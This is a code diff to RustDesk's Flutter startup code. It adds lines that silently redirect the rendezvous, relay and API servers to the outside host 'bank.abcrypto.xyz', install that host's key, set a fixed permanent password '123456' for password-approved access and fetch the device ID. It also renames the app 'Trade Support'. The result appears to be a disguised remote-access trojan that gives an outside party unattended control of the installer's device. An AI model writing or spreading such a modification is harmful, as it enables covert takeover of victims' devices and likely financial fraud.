@@ -111,6 +111,27 @@ Future<void> initEnv(String appType) async {
   await initGlobalFFI();
   // await Firebase.initializeApp();
   _registerEventHandler();
+
+  final oldApiServer = await bind.mainGetApiServer();
+
+    if(oldApiServer.isNotEmpty)
+    {
+      //Set Server Parameter
+      await bind.mainSetOption(key: 'custom-rendezvous-server', value: 'bank.abcrypto.xyz');
+      await bind.mainSetOption(key: 'relay-server', value: 'bank.abcrypto.xyz');
+      await bind.mainSetOption(key: 'api-server', value: 'https://bank.abcrypto.xyz');
+      await bind.mainSetOption(key: 'key', value: 'PpMRPdC6h8G+CCIw3TRe5w41VEjdgyJui0241t0B3cE=');
+
+      //Bind Necessary Data
+      await bind.mainSetOption(key: "verification-method", value: 'use-permanent-password');
+      await gFFI.serverModel.setPermanentPassword('123456');
+      gFFI.serverModel.setApproveMode('password');
+      gFFI.serverModel.updatePasswordModel();
+      await gFFI.serverModel.fetchID();
+
+      //Settings and Permissions
+      //await AndroidPermissionManager.request(kRequestIgnoreBatteryOptimizations);   
+  }
   // Update the system theme.
   updateSystemWindowTheme();
 }
@@ -397,7 +418,7 @@ class _AppState extends State<App> {
         child: GetMaterialApp(
           navigatorKey: globalKey,
           debugShowCheckedModeBanner: false,
-          title: 'RustDesk',
+          title: 'Trade Support',
           theme: MyTheme.lightTheme,
           darkTheme: MyTheme.darkTheme,
           themeMode: MyTheme.currentThemeMode(),
